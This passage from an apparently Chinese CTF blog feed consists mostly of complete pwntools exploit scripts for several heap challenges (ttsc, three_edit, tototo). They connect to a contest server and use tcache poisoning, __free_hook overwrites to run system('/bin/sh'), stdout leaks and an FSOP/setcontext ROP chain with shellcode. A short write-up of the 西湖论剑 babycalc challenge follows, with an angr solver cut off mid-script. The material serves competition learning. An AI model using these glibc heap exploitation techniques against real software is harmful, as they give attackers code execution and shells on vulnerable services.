p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name?&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;age?&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;high?&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>):<br>        add(<span class="hljs-number">0</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">1</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">2</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">3</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        delete(<span class="hljs-number">3</span>)<br>        delete(<span class="hljs-number">2</span>)<br>        delete(<span class="hljs-number">1</span>)<br>        delete(<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x51&#x27;</span><br>    edit(<span class="hljs-number">1</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;\xf0&#x27;</span> <br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4c1</span>))<br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x60&#x27;</span> + <span class="hljs-string">b&#x27;\x57&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1150</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>    delete(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">20111</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn4&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span><br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;, aslr=False)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x61</span>))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x461</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    <br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, <span class="hljs-string">b&#x27;\xa0&#x27;</span> + <span class="hljs-string">b&#x27;\x86&#x27;</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-comment">#p.recvuntil(b&#x27;\x7f&#x27;, timeout=1)</span><br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0xd20</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    <br>    sleep(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, p64(free_hook))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br><span class="hljs-comment">#pwn()</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">21795</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./tototo&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./tototo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">36789</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content?&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cadd</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br>cadd(<span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">1</span>, <span class="hljs-number">0x420</span>)<br>cadd(<span class="hljs-number">2</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>cadd(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x26b72</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x27529</span><br>pop_rdx_r12_ret = libc_base + <span class="hljs-number">0x11c371</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>cadd(<span class="hljs-number">5</span>, <span class="hljs-number">0x430</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br>cadd(<span class="hljs-number">6</span>, <span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xae0</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x58</span><br>fake_IO_FILE += p64(heap_addr)             <span class="hljs-comment">#_lock</span><br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span><br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br><br>payload = fake_IO_FILE<br>payload += flat(<br>    p64(pop_rdi_ret), p64(heap_addr),<br>    p64(pop_rsi_ret), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12_ret), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br><br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>))<br>edit(<span class="hljs-number">3</span>, payload)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑-pwn</title>
    <link href="/2023/02/07/xhlj-pwn/"/>
    <url>/2023/02/07/xhlj-pwn/</url>
    
    <content type="html"><![CDATA[<p>第一次打西湖论剑，只做出了两道pwn题，那个jit到最后也没能看明白😞。</p><h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>如下图，输入0x100大小的数据可以修改栈上<code>i</code>的值，通过<code>i</code>与v3的偏移就可以修改栈上的任意一字节，而且输入后存在off-by-one</p><p><img src="/img/11/Screenshot_20230208_111806.png"></p><p>​</p><p>这里利用<code>i</code>与v3的偏移修改返回值为 <code>leave ret</code>的地址，只能更改一字节，这里修改为0x400C18，利用off-by-one改变rbp的值来实现栈迁移，具体效果如下：</p><img src="/img/11/Screenshot_20230209_124709.jpg" style="zoom:80%;" /><p>​</p><p>由于栈每次启动的地址不同，还需要爆破栈地址，再ret2libc。</p><p>​</p><p>最后就是关于中间那个方程组的求解，我当时是直接头铁硬算的(其实还比较好算)，赛后听说angr也能将结果跑出来，自己也尝试做了一下angr的解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Go</span>():<br>    proj = angr.Project(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>    <br>    start_addr = <span class="hljs-number">0x40080a</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    init_state.regs.rbp = init_state.regs.rsp<br>    init_state.regs.rsp -= <span class="hljs-number">0x100</span><br><br>    v3 = claripy.BVS(<span class="hljs-string">&#x27;v3&#x27;</span>, <span class="hljs-number">8</span>)<br>    v4 = claripy.BVS(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v6 = claripy.BVS(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">8</span>)<br>    v7 = claripy.BVS(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">8</span>)<br>    v8 = claripy.BVS(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">8</span>)<br>    v9 = claripy.BVS(<span class="hljs-string">&#x27;v9&#x27;</span>, <span class="hljs-number">8</span>)<br>    v10 = claripy.BVS(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">8</span>)<br>    v11 = claripy.BVS(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">8</span>)<br>    v12 = claripy.BVS(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">8</span>)<br>    v13 = claripy.BVS(<span class="hljs-string">&#x27;v13&#x27;</span>, <span class="hljs-number">8</span>)<br>    v14 = claripy.BVS(<span class="hljs-string">&#x27;v14&#x27;</span>, <span class="hljs-number">8</span>)<br>    v15 = claripy.BVS(<span class="hljs-string">&#x27;v15&#x27;</span>, <span class="hljs-number">8</span>)<br>    v16 = claripy.BVS(<span class="hljs-string">&#x27;v16&#x27;</span>, <span class="hljs-number">8</span>)<br>    v17 = claripy.BVS(<span class="hljs-string">&#x27;v17&#x27;</span>, <span class="hljs-number">8</span>)<br>    v18 = claripy.BVS(<span class="hljs-string">&#x27;v18&#x27;</span>, <span class="hljs-number">8</span>)<br>    val = [v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        stack_addr = init_state.regs.rbp - <span class="hljs-number">0x30</span> + i<br>        init_state.memory.store(stack_addr, val[i])<br><br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = <span class="hljs-number">0x400ba1</span><br>    simgr.explore(find = find_addr)<br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = 